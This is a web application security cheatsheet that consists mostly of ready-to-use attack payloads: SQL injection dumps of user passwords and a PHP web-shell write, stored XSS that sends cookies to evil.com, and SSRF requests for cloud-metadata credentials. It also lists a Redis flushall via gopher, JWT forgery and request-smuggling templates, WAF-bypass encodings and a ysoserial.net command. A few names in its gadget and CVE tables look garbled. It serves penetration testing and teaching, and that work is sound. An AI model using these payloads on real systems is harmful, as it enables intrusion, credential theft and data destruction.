# Web Application Security — Quick Reference Cheatsheet

## SQL Injection Payload Reference

### Union-Based SQLi

```sql
-- Column count enumeration
' ORDER BY 1-- -
' ORDER BY 5-- -

-- Union injection
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Database enumeration (MySQL)
' UNION SELECT schema_name FROM information_schema.schemata-- -
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='app_db'-- -
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT concat(username,':',password) FROM users-- -

-- Database enumeration (PostgreSQL)
' UNION SELECT datname FROM pg_database-- -
' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'-- -

-- Database enumeration (MSSQL)
' UNION SELECT name FROM sys.databases-- -
' UNION SELECT table_name FROM information_schema.tables-- -

-- File read (MySQL)
' UNION SELECT load_file('/etc/passwd')-- -
' UNION SELECT load_file(0x2f6574632f706173737764)-- -

-- File write (MySQL)
' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Blind SQLi

```sql
-- Boolean-based
' AND 1=1-- -      (true)
' AND 1=2-- -      (false)
' AND substring(version(),1,1)=5-- -
' AND (SELECT length(password) FROM users WHERE username='admin')=32-- -
' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='admin')>96-- -

-- Time-based
' AND sleep(5)-- -                                              (MySQL)
' AND pg_sleep(5)-- -                                            (PostgreSQL)
' WAITFOR DELAY '0:0:5'-- -                                      (MSSQL)
' AND (SELECT count(*) FROM generate_series(1,5000000))>0-- -   (PostgreSQL CPU)
```

### WAF Bypass (SQLi)

```
-- Encoding
%53ELECT                    -- URL encoding (S)
SEL%45CT                    -- URL encoding mid-string
0x53454c454354              -- Hex string (MySQL)
%75%6e%69%6f%6e             -- Full URL encoding (union)
\u0053ELECT                 -- Unicode encoding

-- Comment injection
/**/SELECT/**/password/**/FROM/**/users
SELECT/*comment*/password FROM users
/*!50000SELECT*/password FROM users  -- MySQL version comment

-- Case manipulation
sElEcT * FrOm users
SeLect * FrOm users

-- Whitespace alternatives
SELECT%0apassword%0aFROM%0ausers    -- Newlines
SELECT%09password%09FROM%09users    -- Tabs
SELECT%0dpassword%0dFROM%0dusers    -- CR

-- HTTP Parameter Pollution
id=1&id=UNION&id=SELECT&id=password&id=FROM&id=users

-- Double encoding
%2527 → %27 → '    (double URL encode of single quote)
%253C → %3C → <     (for XSS)

-- JSON injection
{"username":"admin'--","password":"x"}
{"query":"SELECT * FROM users WHERE name='$name'"}

-- Overlong UTF-8 (%c0%ae = . in some parsers)
http://target.com/admin%c0%ae/secure_page
```

---

## Cross-Site Scripting (XSS) Payload Reference

### Reflected XSS

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<math><mtext></mtext><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

### Stored XSS

```html
<!-- Persistent via comment/forum -->
<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
<svg/onload=fetch('https://evil.com/steal?c='+document.cookie)>
<img src=x onerror="location='https://evil.com/steal?c='+document.cookie">

<!-- HTML injection in profile fields -->
" onmouseover="alert(1)" x="
'><script>alert(document.domain)</script>
```

### DOM XSS

```javascript
// Sinks
document.write(userInput)
element.innerHTML = userInput
element.outerHTML = userInput
eval(userInput)
setTimeout(userInput, 1000)
setInterval(userInput, 1000)
new Function(userInput)
location.href = userInput          // open redirect → XSS if javascript: URI
document.domain = userInput

// Sources
location.href / location.search / location.hash
document.URL / document.documentURI
document.referrer
window.name
postMessage event.data
```

### CSP Bypass

```
-- script-src 'unsafe-inline'
<script>alert(1)</script>

-- script-src 'unsafe-eval'
<script>eval('alert(1)')</script>

-- script-src 'self' + JSONP endpoint
<script src="/api/callback?callback=alert(1)//"></script>

-- script-src 'self' + path-relative import
<script src="/../../../lib/..%2f..%2fattacker/evil.js"></script>

-- script-src 'nonce-xxx' (nonce reuse/leak)
<script nonce="known-nonce">alert(1)</script>

-- No object-src restriction
<object data="data:text/html,<script>alert(1)</script>">

-- Base tag injection (rewrites relative script src)
<base href="https://evil.com/">

-- script-src 'strict-dynamic' (edge cases)
<script>{alert(1)}</script>  <!-- if trusted-types policy allows -->
```

### DOM Clobbering

```html
<form id=location><input name=href value="javascript:alert(1)">
<img name=globalConfig src=x onerror=eval(window.globalConfig.src)>
<a id=__proto__ href="javascript:alert(1)">
```

---

## SSRF Payload Reference

### Cloud Metadata Endpoints

```bash
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS IMDSv2 (requires PUT first for token)
# PUT http://169.254.169.254/latest/api/token → X-aws-ec2-metadata-token
# Then: GET with header X-aws-ec2-metadata-token: <token>

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header required: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Header required: Metadata: true

# DigitalOcean
http://169.254.169.254/metadata/v1.json

# Kubernetes
https://kubernetes.default.svc/api/v1/namespaces/default/pods
https://kubernetes.default.svc/api/v1/secrets
# Service account token: /var/run/secrets/kubernetes.io/serviceaccount/token
```

### SSRF Bypass Techniques

```bash
# Localhost bypasses
127.0.0.1, 0x7f000001, 0177.0.0.1, 2130706433, 127.1, 0, [::1], [::ffff:127.0.0.1]

# DNS rebinding (7s TTL)
# First: 1.evil.com → 127.0.0.1 (passes SSRF check)
# Second: 1.evil.com → internal.host (resolves to internal IP)
1.evil.com

# URL parser confusion
http://evil.com#@internal.com/
http://evil.com%00@internal.com/
http://internal.com%00.evil.com/
http://internal.com#@evil.com/
http://internal.com\\@evil.com/

# Open redirect chains
http://victim.com/redirect?url=http://internal:8080/
http://victim.com/redirect?next=http://internal/

# Protocol smuggling
gopher://internal:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a    (Redis via gopher)
dict://internal:6379/info                              (Redis via dict)
ldap://internal:389/                                  (LDAP)
```

---

## JWT Attack Reference

| Attack | Mechanism | Payload / Technique |
|--------|-----------|---------------------|
| **None algorithm** | `alg: none` bypasses signature verification | `{"alg":"none","typ":"JWT"}.{"sub":"admin"}.` |
| **Algorithm confusion** | Change `alg` from RS256 to HS256; sign with public key as HMAC secret | `{"alg":"HS256"}.{"sub":"admin"}` + HMAC with RSA public key |
| **Weak HMAC secret** | Brute force the shared secret | `jwt-cracker -t <token> -d rockyou.txt` |
| **JWK injection** | Embed attacker's public key in `jwk` header | `{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}` |
| **Kid path traversal** | `kid` parameter used as filename → path traversal or SQLi | `{"kid":"../../dev/null"}` → empty secret; `{"kid":"' OR 1=1--"}` → SQLi |
| **Claim manipulation** | Modify `sub`, `role`, `iss` claims; re-sign if key known | `{"sub":"admin"}` instead of `{"sub":"user123"}` |
| **jku header** | `jku` points to attacker-controlled JWKS URL | `{"alg":"RS256","jku":"https://evil.com/jwks.json"}` |
| **Token replay** | Reuse token past expiration or on different service | Missing `exp` claim or no audience validation |

### JWT Testing Commands

```bash
# Decode without verification
jwt_tool.py <token> -R

# Algorithm confusion attack
jwt_tool.py <token> -X k  # RS256 → HS256 with public key

# None algorithm attack
jwt_tool.py <token> -X n

# Brute force HMAC secret
hashcat -m 16500 <token> rockyou.txt

# Inject JWK
jwt_tool.py <token> -X i  # inject self-signed JWK
```

---

## OWASP Top 10 Quick Checks

| # | 2021 Category | Quick Check |
|---|--------------|-------------|
| A01 | Broken Access Control | BOLA/IDOR: Change `user_id=5` to `user_id=1`; force-browse `/admin/`; check CORS headers |
| A02 | Cryptographic Failures | Check TLS version (≥1.2); search for hardcoded keys/IVs; check password hashing (bcrypt/argon2?); verify JWT alg |
| A03 | Injection | SQLi: `' OR 1=1--`, `"` in search; XSS: `<script>alert(1)</script>`; command: `; id` in parameters |
| A04 | Insecure Design | Rate limiting on auth endpoints; business logic abuse (negative quantities); missing MFA |
| A05 | Security Misconfiguration | Default credentials; directory listing enabled; unnecessary HTTP methods; verbose errors; missing security headers |
| A06 | Vulnerable & Outdated Components | Run `npm audit` / `pip-audit` / OWASP Dependency-Check; check CVEs for all dependencies |
| A07 | Auth & Session Failures | Credential stuffing possible? JWT none algorithm? Session fixation? MFA bypass? |
| A08 | Software & Data Integrity | CI/CD pipeline security? SRI on CDN resources? Unsigned packages? Deserialization of untrusted data? |
| A09 | Logging & Monitoring Failures | Failed auth logged? Attack detection? Incident response? Log injection possible? |
| A10 | SSRF | Fetch arbitrary URLs? Cloud metadata accessible? Internal port scanning? DNS rebinding? |

---

## HTTP Request Smuggling Payload Reference

### CL-TE Smuggling (Frontend Uses CL, Backend Uses TE)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE-CL Smuggling (Frontend Uses TE, Backend Uses CL)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: vulnerable.com
Content-Length: 15

x=1
0

```

### TE-TE Obfuscation

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

### Smuggling Detection Payloads

```http
# Timing-based detection (CL-TE)
POST / HTTP/1.1
Host: target
Content-Length: 7
Transfer-Encoding: chunked

7
SMUGGLE
0

# Timing-based detection (TE-CL)
POST / HTTP/1.1
Host: target
Content-Length: 7
Transfer-Encoding: chunked

0

SMUGGLE
```

### Smuggling Impact

| Attack | Mechanism | Result |
|--------|-----------|--------|
| **Auth bypass** | Smuggle admin request prepended to victim's request | Victim's session used for admin action |
| **Cache poisoning** | Smuggle request that sets cacheable response | All users receive poisoned response |
| **Cache deception** | Smuggle request for `/profile.css` → backend returns profile data | CDN caches sensitive data |
| **Request queue poisoning** | Smuggle partial request; next user's request appended | Victim receives attacker's response |

---

## Deserialization Gadget Chain Reference

### Java

| Library | Gadget | Effect | CVE/Reference |
|---------|--------|--------|---------------|
| Commons Collections 3.x | `InvokerTransformer` → `Runtime.exec()` | RCE | CVE-2015-4852 (Foxglove) |
| Commons Collections 4.x | `TransformingComparator` → `InvokerTransformer` | RCE | Commons Collections 4 variant |
| Commons BeanUtils | `BeanComparator` → `TemplatesImpl.getOutputProperties()` | RCE | ysoserial CommonsBeanutils1 |
| Spring | `ObjectFactoryDelegatingInvocationHandler` | RCE | Spring framework gadget |
| Jackson | `@JsonTypeInfo(use=Id.CLASS)` → polymorphic deserialization | RCE | CVE-2017-17485 |
| XStream | ProcessConexion, ImageIO, HashMap → `Runtime.exec()` | RCE | CVE-2020-26217 |
| JNDI Injection | `JdbcRowSetImpl.setAutoCommit()` → JNDI lookup | RCE | Log4Shell (CVE-2021-44228) variant |
| ROME | `EqualsBean` → `ToStringBean` → `JdbcRowSetImpl` | RCE | ysoserial ROME gadget |
| Hibernate | `ComponentType` → `Getter` → `TemplatesImpl` | RCE | ysoserial Hibernate1 |

**Tools:** `ysoserial`, `marshalsec`, `gadgetinspector`, `SerialKillerBypassFilter`

### PHP

| Framework | Gadget Chain | Effect |
|-----------|--------------|--------|
| Laravel | `PendingBroadcast` → `Dispatcher` → `BroadcastDispatcher` | RCE |
| Yii2 | `BatchQueryResult.__destruct()` → DB command execution | RCE |
| Magento | `Credis_Client` → Redis command injection | RCE |
| WordPress | Various plugin `__destruct()` / `__wakeup()` chains | RCE |
| Monolog | `BufferHandler.__destruct()` → log file write | File write |
| Guzzle | `FnStream.__destruct()` → `close()` → arbitrary function call | RCE |

**Phar deserialization trigger points:** `file_exists()`, `is_file()`, `is_dir()`, `is_readable()`, `filemtime()`, `stat()`, `fopen()`, `file_get_contents()`, `include()`, `copy()`, `fileinode()`, `fileowner()`, `filegroup()`, `fileperms()`, `filetype()`, `md5_file()`, `sha1_file()`

### Python

| Mechanism | Payload | Effect |
|-----------|---------|--------|
| `pickle.loads()` | `__reduce__()` returning `(os.system, ('id',))` | RCE |
| `yaml.load()` (unsafe) | `!!python/object/apply:os.system ["id"]` | RCE |
| `yaml.load()` (unsafe) | `!!python/object/new:subprocess.check_output [["id"]]` | RCE |
| `shelve.open()` | Uses pickle internally | RCE |
| `numpy.load()` | Uses pickle internally for `.npy` format | RCE |

### .NET

| Mechanism | Gadget Chain | Effect |
|-----------|--------------|--------|
| `BinaryFormatter` | `ActivitySurrogateSelector` | RCE |
| `BinaryFormatter` | `ObjectDataProvider` → `Process.Start()` | RCE |
| `BinaryFormatter` | `WindowsIdentity` | RCE |
| `LosFormatter` (ViewState) | `ObjectStateFormatter` → type-confused deserialization | RCE if MAC key known |
| JSON.NET | `TypeNameHandling.Objects/Auto` → type instantiation | RCE |
| `SoapFormatter` | Same as BinaryFormatter gadgets | RCE |

**Tools:** `ysoserial.net`, `YSoSerial.NET`

**ViewState exploitation:**
```
# If MAC validation disabled or key known
ysoserial.net -f LosFormatter -g ActivitySurrogateSelector -c "cmd /c calc.exe" -o base64

# If web.config is accessible (contains machineKey)
# → forge valid ViewState with arbitrary gadget chains
```

---

## WAF Bypass Technique Checklist

| Category | Technique | Example |
|----------|-----------|---------|
| **Encoding** | URL encoding | `%3Cscript%3E` |
| | Double URL encoding | `%253Cscript%253E` |
| | Unicode encoding | `%u003Cscript%u003E` |
| | HTML entity encoding | `&#60;script&#62;` |
| | Hex encoding | `0x3C7363726970743E` |
| | Base64 in parameters | `?q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| **Obfuscation** | Comment injection | `SEL/**/ECT * FR/**/OM users` |
| | Case manipulation | `sElEcT * FrOm users` |
| | Whitespace substitution | `SELECT%0a*%0aFROM%09users` |
| | Null byte injection | `%00<script>alert(1)</script>` |
| | String concatenation | `'al'+'ert(1)'` (JS), `con` `cat()` (SQL) |
| | Nested encoding | Triple URL encoding for deep proxies |
| **Protocol** | HTTP Parameter Pollution | `id=1&id=UNION SELECT ...` |
| | Chunked transfer encoding | Bypass body inspection |
| | HTTP/2 multiplexing | Bypass HTTP/1.1 WAF rules |
| | Content-Type confusion | `application/json` parsed as form data by backend |
| | Header splitting | CR/LF in header values |
| **Path** | Path normalization differences | `/../admin/` vs `/admin/` |
| | Overlong UTF-8 in paths | `/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd` |
| | Double URL decode in path | `/..%252f..%252fetc/passwd` |
| | Backslash vs forward slash | `\..\` vs `/../` (IIS) |
| **Grammar** | SQL comment variants | `/*!50000SELECT*/`, `-- `, `#`, `/*comment*/` |
| | JSON/XML alternative syntax | `{"username":{"$gt":""}}` (NoSQL) |
| | Alternative XPath/AST | `or 1=1` → `or 1` → `|| True` |

---

## Web Security Testing Checklist

### Reconnaissance

- [ ] Subdomain enumeration (subfinder, amass, crt.sh)
- [ ] Technology identification (whatweb, Wappalyzer)
- [ ] Content discovery (ffuf, gobuster, feroxbuster)
- [ ] JavaScript analysis (endpoint extraction, API key search)
- [ ] OpenAPI/Swagger/GraphQL introspection
- [ ] DNS zone transfer attempts
- [ ] Search engine dorking (site:, inurl:, filetype:)
- [ ] Wayback Machine / cached versions
- [ ] Cloud bucket discovery (S3, GCS, Azure Blob)

### Authentication & Authorization

- [ ] Default/weak credentials
- [ ] Credential stuffing / brute force possibility
- [ ] MFA bypass (SMS interception, push fatigue, race conditions)
- [ ] Password reset flaws (predictable tokens, user enumeration)
- [ ] Session fixation
- [ ] JWT attacks (none algorithm, algorithm confusion, weak secret, kid injection, jku)
- [ ] OAuth flows (redirect_uri validation, state parameter, code leakage)
- [ ] BOLA / IDOR (change user IDs, UUID vs integer, API path manipulation)
- [ ] Privilege escalation (vertical, horizontal)
- [ ] CORS misconfiguration (origin reflection, null origin, subdomain wildcard)

### Injection

- [ ] SQL injection (in-band, blind, time-based, out-of-band)
- [ ] XSS (reflected, stored, DOM-based)
- [ ] Command injection (OS commands, blind)
- [ ] SSTI (Jinja2, Freemarker, Twig, Velocity, Thymeleaf, EJS)
- [ ] LDAP injection
- [ ] XPATH injection
- [ ] NoSQL injection (MongoDB operator injection, etc.)
- [ ] Header injection (CRLF, HPP)
- [ ] Log injection (log4shell, log forging)

### API Security

- [ ] Mass assignment (test with extra fields like `isAdmin`, `role`)
- [ ] Excessive data exposure (response contains more fields than UI shows)
- [ ] Rate limiting present and consistent
- [ ] GraphQL introspection enabled
- [ ] GraphQL batching / alias abuse for brute force
- [ ] Missing resource-level authorization
- [ ] Improper HTTP method handling (PUT/DELETE on GET endpoints)
- [ ] API version deprecation and sunset headers

### Client-Side

- [ ] CSP headers present and strict
- [ ] CORS misconfiguration
- [ ] postMessage origin validation
- [ ] Cookie flags (HttpOnly, Secure, SameSite)
- [ ] DOM clobbering vectors
- [ ] Prototype pollution (`__proto__`, `constructor.prototype`)
- [ ] Service worker scope and security
- [ ] SRI on third-party resources
- [ ] Web Worker Same-Origin Policy enforcement

### File Upload

- [ ] Extension bypass (`.php5`, `.phtml`, `.php.jpg`, `.htaccess`)
- [ ] Content-Type verification bypass
- [ ] Magic bytes / file signature check
- [ ] Path traversal in filename (`../shell.php`)
- [ ] Double extensions (`shell.php.jpg`)
- [ ] Polyglot files (valid image + JS/PHP)
- [ ] Null byte in filename (`shell.php%00.jpg`)

### SSRF & Request Smuggling

- [ ] SSRF via URL parameters, file imports, webhook URLs
- [ ] Cloud metadata endpoint access (169.254.169.254)
- [ ] Internal port scanning via SSRF
- [ ] DNS rebinding
- [ ] Protocol smuggling (gopher://, dict://)
- [ ] CL-TE, TE-CL, TE-TE smuggling detection
- [ ] Request queue poisoning
- [ ] Cache poisoning / deception via smuggling

### Cryptographic & Data

- [ ] TLS configuration (version, cipher suites, HSTS)
- [ ] Insecure password storage (MD5, SHA1 without salt)
- [ ] Hardcoded keys and secrets
- [ ] JWT algorithm and key management
- [ ] Deserialization (Java, PHP, Python, .NET)
- [ ] Insecure direct object references
- [ ] Sensitive data in URLs, logs, or client-side storage

---

## Key CVE Quick-Reference Table

| CVE | Year | Vulnerability | Impact | Component/Platform |
|-----|------|--------------|--------|--------------------|
| CVE-2014-0160 | 2014 | Heartbleed (OpenSSL read overrun) | Information disclosure (private keys, sessions) | OpenSSL 1.0.1–1.0.1f |
| CVE-2017-5638 | 2017 | Apache Struts2 OGNL injection | RCE | Apache Struts 2 |
| CVE-2017-9805 | 2017 | Apache Struts2 REST XStream deserialization | RCE | Apache Struts 2 REST plugin |
| CVE-2017-12635 | 2017 | CouchDB `reduce` function injection | Admin creation, RCE | Apache CouchDB |
| CVE-2017-12636 | 2017 | CouchDB `os_process` command execution | RCE | Apache CouchDB |
| CVE-2018-11776 | 2018 | Apache Struts2 namespace OGNL injection | RCE | Apache Struts 2 |
| CVE-2019-5786 | 2019 | Chrome FileReader UAF | Sandbox escape (renderer) | Chrome/Blink |
| CVE-2019-11043 | 2019 | PHP-FPM path normalization RCE | RCE | PHP-FPM + nginx |
| CVE-2019-11510 | 2019 | Pulse Secure arbitrary file read | RCE, credential theft | Pulse Secure VPN |
| CVE-2020-0688 | 2020 | Exchange Server ViewState RCE | RCE (known machineKey) | Microsoft Exchange |
| CVE-2020-3452 | 2020 | Cisco ASA/FTD path traversal | File read | Cisco ASA |
| CVE-2020-5902 | 2020 | F5 BIG-IP unauthenticated RCE | RCE | F5 BIG-IP |
| CVE-2020-15505 | 2020 | MobileIron RCE | RCE | MobileIron MDM |
| CVE-2020-17519 | 2020 | Apache Flink path traversal | Arbitrary file read | Apache Flink |
| CVE-2021-21972 | 2021 | vCenter Server unauthenticated RCE | RCE | VMware vCenter |
| CVE-2021-22205 | 2021 | GitLab CE/EE SSRF + upload RCE | RCE | GitLab |
| CVE-2021-26085 | 2021 | Atlassian Confluence OGNL injection | RCE | Confluence |
| CVE-2021-41773 | 2021 | Apache HTTPD path traversal | File read | Apache HTTP Server 2.4.49 |
| CVE-2021-42013 | 2021 | Apache HTTPD path traversal (bypass) | File read / RCE | Apache HTTP Server 2.4.50 |
| CVE-2021-44228 | 2021 | Log4Shell (Log4j JNDI RCE) | RCE | Apache Log4j 2.x |
| CVE-2021-45232 | 2021 | Apache APISQL dashboard auth bypass | RCE | Apache APISIX |
| CVE-2022-1388 | 2022 | F5 BIG-IP iControl REST RCE | RCE | F5 BIG-IP |
| CVE-2022-22954 | 2022 | VMware Workspace ONE SSTI | RCE | VMware Workspace ONE |
| CVE-2022-22965 | 2022 | Spring4Shell (Classloader manipulation) | RCE | Spring Framework |
| CVE-2022-26134 | 2022 | Atlassian Confluence OGNL injection | RCE | Confluence |
| CVE-2022-35414 | 2022 | PHP phar deserialization | RCE | PHP applications |
| CVE-2022-41080 | 2022 | Microsoft Exchange ProxyNotShell | RCE | Exchange Server |
| CVE-2023-20198 | 2023 | Cisco IOS XE web UI privilege escalation | RCE (root) | Cisco IOS XE |
| CVE-2023-22515 | 2023 | Atlassian Confluence broken access control | RCE | Confluence |
| CVE-2023-44487 | 2023 | HTTP/2 Rapid Reset DoS | DoS (amplified) | HTTP/2 implementations |
| CVE-2023-4863 | 2023 | libwebp heap buffer overflow | RCE (browser) | Chrome, Safari, Signal |
| CVE-2024-1709 | 2024 | ScreenConnect auth bypass | RCE | ConnectWise ScreenConnect |
| CVE-2024-27198 | 2024 | JetBrains TeamCity auth bypass | RCE | TeamCity |
| CVE-2024-3400 | 2024 | PAN-OS command injection | RCE | Palo Alto Networks |
| CVE-2024-47575 | 2024 | FortiManager missing auth | RCE | FortiManager |

---

## References

1. OWASP Foundation. "OWASP Top 10:2021." https://owasp.org/Top10/
2. PortSwigger Ltd. "Web Security Academy." https://portswigger.net/web-security
3. MITRE Corporation. "Common Vulnerabilities and Exposures (CVE)." https://cve.mitre.org/
4. MITRE Corporation. "CWE/SANS Top 25 Most Dangerous Software Weaknesses." https://cwe.mitre.org/top25/
5. NIST. "National Vulnerability Database (NVD)." https://nvd.nist.gov/
6. Rapid7. "Vulnerability & Exposure Database." https://www.rapid7.com/db/
7. PayloadAllTheThings. "Web Application Security Payloads." https://github.com/swisskyrepo/PayloadsAllTheThings
8. HackTricks. "Pentesting Methodology & Payloads." https://book.hacktricks.xyz/
9. OWASP Foundation. "OWASP Testing Guide v4." https://owasp.org/www-project-web-security-testing-guide/
10. OWASP Foundation. "OWASP Cheat Sheet Series." https://cheatsheetseries.owasp.org/
11. Mozilla MDN. "HTTP Response Status Codes." https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
12. RFC 9110-9114. "HTTP Core Specifications." IETF, 2022.